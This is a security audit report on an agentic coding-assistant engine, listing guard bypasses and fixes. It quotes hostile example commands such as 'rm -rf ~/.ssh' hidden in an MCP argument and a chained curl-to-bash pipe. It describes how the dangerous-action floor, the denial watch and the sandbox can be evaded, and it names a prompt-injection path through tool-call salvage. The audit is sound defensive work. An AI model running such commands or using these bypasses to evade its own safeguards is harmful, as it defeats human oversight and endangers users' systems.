# Code Review — apogee (repository-wide security audit) — 2026-09-26

**Scope:** Full repository — engine (`internal/*`), CLI composition root (`cmd/apogee`), the dev-only recording rig (`cmd/demorig`), build/release tooling (`scripts/`, `.github/`), and root-level build plumbing.
**Mission:** apogee is an open-source, embeddable Go agentic coding-assistant engine with a terminal (Bubble Tea v2) UI as its first front-end, purpose-built so small, locally hosted LLMs can do real agentic work (file edits, shell, git, tests, web, MCP, sub-agents) unattended or supervised, while scaling cleanly to frontier models.
**Files reviewed:** 1230

## Executive Summary

apogee's security posture is generally strong for a project that puts an LLM in an agentic loop with real filesystem, shell, and git access: the OS-level confinement backends, secret redaction, and TOCTOU-hardening on file writes mostly hold up under adversarial review, and several packages (`internal/config`, `internal/session`, `internal/gitexec`, `internal/present`, `internal/profiles`) came through independent review with no finding above the Medium floor. The most important finding is that the dangerous-action guard — the mode-independent floor meant to stop a malicious MCP server from running a hard-refused command such as `rm -rf ~/.ssh` — can be bypassed simply by naming the argument `body`, `message`, or one of nine other common spellings, because the payload-key exclusion built for a handful of built-in tools is applied by argument-name spelling alone across *every* tool, third-party MCP tools included. A second pattern recurs across several unrelated packages: a guard was built and shipped for one specific case (the read-cache's write-tracking, the PDF inflate-bomb budget, the config `TokenCount` truncation guard) but never extended to sibling cases documented with the identical contract, so the original bug class quietly reopens next to its own fix. Two further high-severity findings — a prompt-injection path through the tool-call salvage guard, and a stdout-merging bypass of the workspace-clobber denial watch — show the model-facing floor guards have concrete, exploitable gaps despite the project's stated hard invariant that nothing apogee does may make a model perform worse than the bare loop. None of this points to systemic architectural rot; it reads as a set of specific, fixable gaps in an otherwise carefully layered defense-in-depth design.

## Intent & Architecture Findings

### High — Any MCP tool can rename its way past the Tier-1 hard-refuse floor `[Security]`
- **Where:** `internal/security/dangerous.go:240-301`
- **What:** The dangerous-action guard's payload-key exclusion (`payloadKeys`/`inspectableText`) is applied by argument-name spelling alone, globally across every tool, not scoped to the specific built-in tool each key was written for. Any MCP tool that names an argument `message`, `body`, `content`, `pattern`, `query`, `title`, `question`, `choices`, `oldtext`, or `newtext` has that argument's value excluded from every rule's inspectable text — including the Tier-1 hard-refuse rules (`rm -rf /`, SSH-key writes, credential-persistence writes, git-control-plane writes, fork bombs, block-device overwrites).
- **Why it matters:** A call like `{"tool":"mcp_run","arguments":{"body":"rm -rf ~/.ssh"}}` passes with `TierNone` — no refusal, no forced approval, no audit — defeating the mode-independent floor for exactly the threat class (a malicious MCP server) this project names in scope, and directly contradicting the guard's own stated invariant that "a third-party tool cannot opt out of the floor." (independently verified)
- **Fix:** Gate the payload exclusion behind the same per-tool declaration mechanism already used for `domain.PromptArgKeys`/`domain.ReadSourceArgKeys`, so only the specific (tool, key) pairs it was written for are excluded and an unrecognized tool stays fully inspected.

### High — Read cache serves stale content after a shell command rewrites a file `[Intent & Structure + Correctness]`
- **Where:** `internal/floor/readcache.go:60-85`
- **What:** The read-cache guard's "not written since" check only recognizes a hard-coded set of built-in file-mutating tool names. It has no knowledge of the shell/terminal tool, which can rewrite an arbitrary file's contents on disk (`sed -i`, `git checkout -- path`, `git reset --hard`, run via `terminal`).
- **Why it matters:** Model reads a file, runs a shell command that rewrites it, then reads it again — the guard sees no tracked write, so the second read is capped to a 1-line header even though the file just changed on disk. This is exactly the "make the model perform worse than the bare loop" outcome the Floor guards are constitutionally barred from causing, in a routine, non-adversarial workflow. (independently verified; scope corrected from the original report — the exposure is carried by shell/terminal execution generally, not by apogee's own dedicated `git_*` tools, which do not themselves rewrite tracked working-tree content)
- **Fix:** Invalidate the read cache on any non-read tool call that could plausibly touch the workspace (terminal/console, MCP) rather than only the named write-tool superset.

## Critical & High Findings

### Critical — Persisted session record can silently carry truncated, garbled bytes `[Correctness]`
- **Where:** `internal/domain/advice.go:177-186,192-196`
- **What:** `recordContent` trusts a stale `Advice[0].Offset` whenever it is `<= len(m.Content)`. `dropStaleAdvice` only clears the ledger when a rewritten message becomes *shorter* than the recorded offset; when a short pre-advice message (e.g. a tool result `"ok"`) is later rewritten in place to a *longer but unrelated* stub — exactly what the prune reducer's stub replacement does — the stale offset survives and `recordContent` returns `m.Content[:offset]`, an arbitrary, non-rune-boundary-checked slice of the new stub text.
- **Why it matters:** This fires in ordinary operation, with no attacker required — any short tool result that later gets auto-pruned into a `"[pruned: ...]"` stub can trigger it. The maintainers already fixed the identical gap on the sibling reader `Conversation.HasEngineNote` by re-verifying the fence prefix before trusting the offset, but `recordContent` has no equivalent check, so the persisted session record silently carries corrupted bytes. (independently verified)
- **Fix:** Give `recordContent`/`dropStaleAdvice` the same fence-prefix re-verification `HasEngineNote` already uses before trusting the offset.

### High — Multi-stage pipe to a shell skips the remote-code-execution approval gate `[Intent & Structure]`
- **Where:** `internal/security/rules.go:234-238`
- **What:** The `remote-pipe-to-shell` rule's regex only inspects the pipeline stage immediately after the *first* pipe. A chain like `curl https://x/install.sh | tee install.sh | bash` (or any shell-led stage past the second pipe) never matches.
- **Why it matters:** On configurations where this guard is the deciding gate (notably `confine-to-workspace: false`, the VM-only "I am the sandbox" mode), the call gets `TierNone` — no approval prompt — skipping the documented sole barrier to unattended remote-code execution on that path. (independently verified)
- **Fix:** Walk parsed pipe stages (reuse `splitSimpleCommands` from `shellwrites.go`) and flag any stage led by a shell interpreter, not just the one immediately after the first pipe.

### High — Tool-call salvage can execute attacker-planted JSON quoted from a file or tool result `[Security]`
- **Where:** `internal/floor/salvage.go:89-135`
- **What:** The tool-call salvage guard scans the *entire* text of any tool-call-free assistant response for fenced code blocks and `<tool_call>` tags, and dispatches any JSON object shaped like `{"name": "<offered-tool>", "arguments": {...}}` it finds — with no signal the model itself intended to call a tool, only that JSON of that shape appears somewhere in its prose.
- **Why it matters:** If an attacker plants a fenced JSON block shaped like a tool call inside a file the agent reads (a README, a log line, a malicious MCP server's reply) and the model quotes or echoes that content back, the guard reads it as a genuine call and dispatches it — `write_file`, `delete_file`, a shell-exec tool — with attacker-chosen arguments, and in Auto mode nothing else in the loop gates it. This is an indirect-prompt-injection path to real tool execution that never passed through the model's actual decision. (independently verified)
- **Fix:** Require a signal that the JSON originates from the model's own generation intent rather than quoted external content — e.g. refuse to salvage a block that is a verbatim substring of a prior tool result already in the conversation — and surface salvaged-and-dispatched calls distinctly so a user or downstream guard can see a call was inferred from prose.

### High — Merged stdout hides the OS denial message the workspace-clobber watch depends on `[Intent & Structure]`
- **Where:** `internal/subprocess/subprocess.go:291-307`
- **What:** The live kill-on-denial watch (built to fix the 2026-08-22 workspace-clobber incident) only wraps `cmd.Stderr`; `cmd.Stdout` is deliberately left unwatched (ADR 0056 decision 2). A model-authored shell line as ordinary as `mkdir /outside 2>&1 && cd /outside` redirects the denied command's stderr onto the unwatched stdout stream before the OS denial text is written.
- **Why it matters:** The denial watch never sees the EPERM-shaped line, the kill never fires, and the guarded lines that follow keep running with the cwd unchanged against the real workspace — reproducing the exact clobber the watch exists to prevent, via an everyday shell idiom rather than deliberate abuse. No existing test exercises a merged-stream denial. (independently verified)
- **Fix:** Watch stdout too when the caller has not asked to split streams, or detect a merged-stream redirect (`2>&1`/`>&2`) in the shell line and force the watch onto the merged fd. Warrants revisiting the ADR 0056 decision-2 amendment itself.

### High — PDF inflate-bomb guard can be bypassed two independent ways `[Intent & Structure + Correctness]`
- **Where:** `internal/doctext/pdf.go:461,518-548,563-601,679,727-746,791`
- **What:** Two independent mechanisms let a crafted PDF bypass `preflightPDF`'s 64 MiB inflate-bomb budget: (1) the stream-body locator uses a regex matching the literal bytes `endstream` rather than the real parser's declared `/Length`, so a deflate "stored block" can embed a decoy `endstream` earlier in the stream, truncating what gets charged while the real parser (which reads by `/Length`) decodes the full stream unbounded; (2) the decode-layer count is derived by counting literal occurrences of the name `/FlateDecode` in the raw dictionary bytes rather than the actual `/Filter` entries, so a dictionary naming `/FlateDecode` twice (even via a `%`-comment) chains a bogus extra zlib reader that fails immediately, making the charged size `0` for the whole stream.
- **Why it matters:** Both paths let an object skip the inflate-bomb charge entirely while the real parser still decodes attacker-controlled content unbounded — reintroducing the unbounded-inflate DoS this guard exists to close, against a file type an autonomous agent is routinely asked to read. (independently verified for both mechanisms)
- **Fix:** Have the preflight scan honor the declared `/Length` instead of searching for a literal `endstream`, and count decode layers from the actual `/Filter` array/name rather than a raw-byte name search.

### High — Windows confinement TOCTOU lets a swapped junction receive the mandatory label, or escape a clear pass `[Security]`
- **Where:** `internal/platform/confiner_windows.go:361-389` (`resolveBoxRoot`) and `internal/platform/winlabel/walk_windows.go:70-115,247-252` (`LabelTree`, `ClearTree`)
- **What:** `resolveBoxRoot`'s reparse-point (symlink/junction) check runs once, before `labelBox`'s per-root calls into `LabelTree`, with no re-verification immediately before the actual `SetNamedSecurityInfo`/`SetSDDL` write — a root swapped for a junction in that window gets the mandatory Low label written onto the link's target instead of the intended root. Separately, `ClearTree`'s descendant callback only applies its symlink skip when `entry.Info()` succeeds, while `LabelTree`'s equivalent callback skips unconditionally on an `Info()` error — a descendant that is actually a symlink but whose `Info()` call fails is skipped by the label pass but not the clear pass, letting `SetSDDL` follow the reparse point and write a NULL SACL onto its target.
- **Why it matters:** Both gaps sit in the OS-level confinement fence Auto mode depends on being enforceable, not advisory — a race-conditioned or asymmetric guard can misdirect a mandatory-integrity-label write to an attacker-chosen location outside the box. (independently verified for both; a related root-level "delete-and-recreate-as-junction" attack on the clear/revert path was investigated and refuted — `revertibleRoots`'s identity check already closes that specific case)
- **Fix:** Resolve the reparse-point check and the write as one atomic operation against a single open handle rather than two separate path-based syscalls, re-verifying immediately before each root's write; give `ClearTree`'s descendant callback the same unconditional skip-on-`Info()`-error `LabelTree` has.

### High — MCP stdio server's grandchild can escape the Windows Job Object during the handshake window `[Intent & Structure + Correctness + Security]`
- **Where:** `internal/mcp/client.go:159-171`, `internal/mcp/transport.go:224-245` (`t.cmd.Start()` at line 233)
- **What:** `td.Contain(cmd)` is only called after the full MCP handshake succeeds, and is skipped entirely on the failure path before `reapProcess`/`td.Reap`. On Windows, a process must join its Job Object immediately after `cmd.Start()` for a later-spawned grandchild to auto-join; here the gap between `Start()` and `Contain()` spans the entire handshake, not the sub-millisecond window the package documents elsewhere.
- **Why it matters:** An ordinary MCP stdio config (`npx`/`uvx`/a shell wrapper) spawns the real server as a child before the handshake completes — that grandchild is never in any Job Object during that window. If the handshake fails or times out, the leader-only degrade path is taken even though a live grandchild exists, violating the documented "no descendant of a configured server outlives the session" guarantee. Windows-only; POSIX establishes the process group at fork and has no equivalent window. (independently verified)
- **Fix:** Call `td.Contain(cmd)` unconditionally inside `stdioTransport.Connect` immediately after `t.cmd.Start()` succeeds, before the handshake runs, on both the eventual-success and eventual-failure path.

### High — Model/props discovery decodes an unbounded response body `[Security]`
- **Where:** `internal/provider/discovery.go:343,385`
- **What:** `discoverModels` and `discoverProps` decode the upstream's `GET /v1/models` and `GET /props` bodies via `json.NewDecoder` with no `io.LimitReader` byte cap, unlike every other response-body read in the package (`Respond` caps at 16 MiB, error bodies at 64 KiB).
- **Why it matters:** `Discover` only bounds time (a 30s timeout), not bytes — a hostile or compromised upstream server (a realistic, named attacker in this project's own threat model) can stream a large body fast enough to be fully decoded before the timeout fires, exhausting memory. This path is reachable on a recurring cadence via `internal/heartbeat`, not just once at startup. (independently verified)
- **Fix:** Wrap `resp.Body` in `io.LimitReader(resp.Body, maxResponseBodyBytes)` in both functions, matching the pattern `Respond` already uses.

### High — Streamed response processing rescans the whole accumulated buffer on every delta `[Security]`
- **Where:** `internal/processing/parserfor.go:80-131` (called from `internal/agent/loop.go:851-852,927-937`)
- **What:** `IsThinking`/`IsHarmonyThinking` and the delimited/harmony strippers re-scan or re-walk the *entire* accumulated response so far on every streamed delta, giving O(N·D) total work for a response of N bytes delivered in D deltas, with no size cap anywhere in the package.
- **Why it matters:** A hostile or misbehaving upstream — this project's own first-named realistic attacker — can hang apogee's event loop or burn CPU for a whole session by streaming a large response as many small chunks, which is also the ordinary per-token streaming shape from local llama.cpp/vLLM/Ollama servers. (independently verified)
- **Fix:** Track an incremental scan position so per-delta cost is O(new bytes) rather than O(total bytes so far), or cap how large the accumulated buffer may grow before forcing a flush.

### High — A failed `git add` silently freezes a stale index entry into an undo snapshot `[Intent & Structure + Correctness]`
- **Where:** `internal/snapshot/store.go:172-184`
- **What:** `Store.Capture` reuses the same persistent on-disk index across calls and stages with `add -A --ignore-errors`; when `add` fails to stage a specific path on one capture (a transient permission error, an EMFILE hiccup, a file mid-delete), that path's index entry is left as whatever it was after the *last successful* add, and the error is discarded once `write-tree` succeeds.
- **Why it matters:** The resulting tree is persisted as "one complete image of the workspace as it stands," but for that path it actually reflects an *earlier* capture — worse than the documented "path was never captured" residue case, because the store actively vouches for content it does not currently reflect. A revert or diff against this tree silently shows or restores stale content, defeating exactly the non-funnel-write coverage (subprocess/MCP/git-checkout writes) this tree-diff mechanism was added to provide. (independently verified)
- **Fix:** Detect which paths `add` actually failed on and reset those paths in the index before `write-tree`, or parse `add`'s stderr for the failing paths and drop/annotate them rather than trusting whatever was last staged.

### High — A keystroke queued before an `ask_user` question is drawn can silently submit it unread `[Intent & Structure + Correctness]`
- **Where:** `internal/tui/ask.go:20-42`
- **What:** `foldAskRequest` has no equivalent of the approval pane's input-drain arming latch, which exists specifically so a keystroke already queued in the terminal before a decision pane is drawn cannot silently answer a request the human has not seen. `stateAwaitingAsk`'s Enter handler calls `submitAnswer()` unconditionally; the sibling approval-pane case explicitly swallows an unarmed Enter.
- **Why it matters:** If the model calls `ask_user` while the human is typing ahead or has buffered/pasted input ending in Enter, the queued Enter fires `submitAnswer()` before the human reads the question — submitting an empty free-text answer or a pre-selected default that then steers subsequent autonomous tool calls. (independently verified)
- **Fix:** Give `foldAskRequest` the same drain-marker arm/backstop `foldApprovalRequest` uses, and gate `stateAwaitingAsk`'s Enter case on it.

### High — Two apogee processes writing config.yaml at once can silently drop one writer's edit `[Concurrency]`
- **Where:** `internal/config/configedit.go:73-93`, `internal/config/configsplice.go:203-229`, and every writer built on `writeConfigAtomically`
- **What:** Every config-file edit is an unsynchronized read-splice-verify-rename cycle with no file lock, in-process mutex, or optimistic version check against the file it started from — `writeConfigAtomically` only checks the file's *mode* before renaming a temp file over it.
- **Why it matters:** Two apogee processes sharing the single `~/.apogee` dotdir (documented, settled configuration) — e.g. two `apogee daemon`/`headless` sessions, or a background auto-title write racing a `/settings` edit — each read the same "before" bytes, each compute a splice that legitimately passes its own verify step, and race on `os.Rename`. The loser's write is silently discarded with no error, even though both calls report success: a remembered model, a saved acknowledgement, or a settings edit can vanish. (independently verified)
- **Fix:** Serialize config-file writes with an OS file lock (flock/LockFileEx) held across the read-splice-verify-write sequence, or a compare-and-swap using the file's mtime/hash captured at read time and checked immediately before the rename.

### High — Console output has no size cap while it accumulates, only after `[Security]`
- **Where:** `internal/tools/console_common.go:163-186`
- **What:** `collectConsoleWindow` accumulates every byte a Console program produces into an in-memory `strings.Builder` for the entire wait window (up to 30s/10s), with the only cap applied *after* the string is already fully materialized.
- **Why it matters:** A booby-trapped repository or compromised upstream model can drive a chatty program to make apogee buffer output-rate × up to 30s of bytes before any bound is enforced — a realistic single-call memory-exhaustion path, worse than the one-shot subprocess execution path, which caps output during the run rather than only at render time. (independently verified)
- **Fix:** Bound the accumulation itself inside the loop once `collected.Len()` reaches the same cap used elsewhere, mirroring the one-shot execution tools.

### High — A developer's ambient API key is forwarded unfiltered into a recorded demo take `[Intent & Structure + Correctness]`
- **Where:** `cmd/demorig/record.go:325-328`
- **What:** `ambientApogeeEnv`, documented as the exhaustive list of `APOGEE_*` variables stripped from a `record`/`capture` take's environment, omits `config.EnvAPIKey` ("APOGEE_API_KEY") while stripping its siblings `EnvEndpoint`/`EnvModel`.
- **Why it matters:** A developer with `APOGEE_API_KEY` exported in their normal shell (a common cloud-provider setup) has that key silently forwarded, unfiltered, into the isolated apogee process a take launches — contradicting the code's own claim that none of these reach it, and risking a personal secret ending up baked into a demo recording's session JSON or terminal frames. `demorig` is a dev-only tool not shipped by `make dist`, which narrows but does not eliminate the exposure for contributors. (independently verified)
- **Fix:** Add `config.EnvAPIKey` to `ambientApogeeEnv`, or filter by an `APOGEE_` prefix plus an explicit allowlist so a future `Env*` constant cannot silently reopen the gap.

### High — A numeric-truncation guard built for one config key was never extended to ten siblings with the same documented contract `[Intent & Structure]`
- **Where:** `internal/config/config.go:649-706` (`TokenCount`) vs. `working-window`, `max-output-tokens`, `parallel-agents`, `delegate-max-steps`, `delegate-fanout-rounds`, `delegate-max-tokens`, `re-stream-budget`, `delegate-max-depth`, `sessions.max-count`, `ui.tools-fold-over`
- **What:** `TokenCount` exists specifically because yaml.v3 silently truncates a fractional scalar (`context-window: 3.5` decodes to `3`) instead of refusing it. The fix was applied only to `context-window:`; every sibling key the code itself documents with the identical three-state contract (absent/0 = default, N≥1 = pin, negative = refused) is still a plain `int`/`*int`.
- **Why it matters:** A user who writes `working-window: 32000.0` or `delegate-max-steps: 2.5` — a plausible copy/paste or templating slip — gets a silently truncated integer instead of the startup refusal every TokenCount-shaped key gives: a wrong Budget or delegation bound with no diagnostic, the exact failure mode `TokenCount` was built to eliminate. No test exercises a fractional value for any of the ten siblings. (independently verified)
- **Fix:** Give these fields the same TokenCount-shaped guard (a shared "non-negative whole token count" YAML type), or add the same `!!float`-tag rejection their own doc comments already promise.

## Medium Findings

### Medium — `apogee probe model` resolves an `api-key-cmd:` outside the exec-from-writable-path fence `[Security]`
- **Where:** `cmd/apogee/probemodel.go:128`
- **What:** `apogee probe model` resolves its bearer key via `config.NewKeyResolver("")` — an empty workspace root — which leaves `RefuseExecFromWritablePath`'s fence list empty, unlike the sibling `apogee probe` (`probe.go:102`), which fences the same key resolution against the real workspace root.
- **Why it matters:** Run from inside a malicious/booby-trapped workspace with `api-key-cmd:` naming a *relative* path (one containing a `/`), an attacker-planted executable at that path runs with the user's privileges. This is narrower than it first appears: a bare, PATH-searched command name (the shape every realistic `api-key-cmd:` example in the project's own docs uses, e.g. `security find-generic-password`) is unaffected either way, since the fence never applied to bare names. (independently verified; severity adjusted down for this narrower trigger)
- **Fix:** Resolve against `roots.workspace` (or `os.Getwd()`) here too, matching `probe.go`'s fenced call.

### Medium — A document-opener override path skips the Windows shell-metacharacter check `[Security]`
- **Where:** `internal/present/opener.go:179-191` vs. `199-215`
- **What:** The `CommandOverride` branch of the document opener (`present.command`) resolves only `argv[0]` through the program fence and never runs the substituted `{path}` argument through the Windows cmd-metacharacter check the built-in `cmd /c start` branch uses.
- **Why it matters:** If the resolved program is itself a `.bat`/`.cmd` shim (a common shape for CLI wrapper installs), Windows re-invokes it through `cmd.exe`, which re-parses the argument list as shell grammar — so a model-chosen document name containing shell metacharacters can ride unchecked into that re-parse. The trigger needs two non-default opt-ins together (`present.command` pointed at a `.bat`/`.cmd` shim, plus `present.command-on-model-documents: true`), which narrows but does not eliminate the exposure. (independently verified)
- **Fix:** Extend the same metacharacter check to the `CommandOverride` branch's substituted path.

### Medium — Concurrent sibling sub-agents sharing a call id can have the wrong delegation status row updated `[Intent & Structure + Correctness]`
- **Where:** `internal/tui/interject.go:428-441`
- **What:** `foldChildDelivery` reconciles a landed/failed child-addressed message using only the collision-prone `CallID`, even though `CallID` is documented as "NOT a unique run identity" and can collide between concurrent siblings from one fan-out reply — the code already carries the full run reference needed to key on `RunID` instead, and a neighboring call site in the same file does exactly that.
- **Why it matters:** Two concurrently fanned-out sub-agents whose calling reply's parser assigns them the same call id can have the wrong `pendingInterjections` row cleared or updated when either child's event lands. The mismatch stays confined to the TUI's delivered/pending display bookkeeping — actual message delivery to the engine is keyed correctly by `RunID` elsewhere — but a human trusting a wrong "delivered" state in a concurrent multi-agent session is a real decision-surface failure. (independently verified)
- **Fix:** Match on the row's own run reference (falling back to `(depth, spawn)` only when `RunID` is empty) instead of `row.spawn != e.CallID`.

### Medium — A patch's pure-insertion hunk always lands at file-end, not at its intended position `[Intent & Structure + Correctness]`
- **Where:** `internal/tools/file_edit.go:209-230`
- **What:** `applyPatch`'s pure-insertion hunk branch (no `oldLines`) does `result += strings.Join(hunk.newLines, "\n")`, which always appends to the end of whatever `result` currently is, never at the position the hunk's place in the patch implies — hunk headers carry no positional anchor that `applyPatch` uses.
- **Why it matters:** In a multi-hunk patch where an earlier hunk performs a real replacement and a later hunk is a pure insertion meant for the middle of the file, the inserted text lands after all prior edits instead of where the model intended — silently, reported as an ordinary success with no error or indication anything is off. (independently verified)
- **Fix:** Require at least one context/removal line to anchor a pure-insertion hunk, or refuse to apply a hunk whose insertion point cannot be determined, rather than defaulting to file-end append.

## Recommended Action Order

1. Close the two security-floor bypasses first — the dangerous-action payload-key exclusion and the remote-pipe-to-shell regex both let a call through with zero gating today; these are cheap, high-leverage fixes with no behavioral downside.
2. Fix the tool-call salvage injection path and the merged-stdout denial-watch gap — both let untrusted content reach real execution or silently defeat a fix already shipped for a named incident.
3. Fix the read-cache staleness gap and the two PDF inflate-bomb bypasses — all three reopen protections the project already built and shipped for exactly this purpose.
4. Address the Windows confinement TOCTOU and the MCP handshake-window escape together — same fix shape (pin an identity/handle before acting instead of after), same platform.
5. Add the three DoS caps (provider discovery, streamed-response processing, console output) — mechanical, low-risk, no change to any happy path.
6. Fix the `ask_user` arming latch — a decision-surface gap with direct consequences for unattended/Auto-mode sessions.
7. The remaining items (config-write locking, the `TokenCount` extension, the snapshot `Capture` staging bug, the demorig env leak, the `present.command` metacharacter check, the `probemodel.go` fence, the interject.go call-id match, and the `file_edit.go` insertion-hunk bug) can follow at normal priority — none has as direct an attacker path as items 1-6.

## What Looked Good

Several subsystems held up well under independent, adversarial review: `internal/config`'s writer transactions all funnel through one splice-verify-rename gate with no exploitable vector found under this project's threat model; `internal/session`'s atomic writes, id validation, and locking discipline matched their documented invariants precisely; `internal/gitexec` and the non-Windows confinement backends (`landlock`, `bwrap`/namespace, seatbelt) fail closed rather than running unconfined whenever they cannot fence a command; `internal/present`, `internal/profiles`, `internal/recall`, `internal/scheme`, and `internal/notice` are small, well-fenced packages with no exploitable security vector; and `internal/undo`'s revert/redo generation-staleness protocol and `internal/tui`'s value-copy and single-goroutine Update-loop discipline (ADR 0011) were independently verified as genuinely sound rather than merely asserted. These are not areas to prioritize for rework.
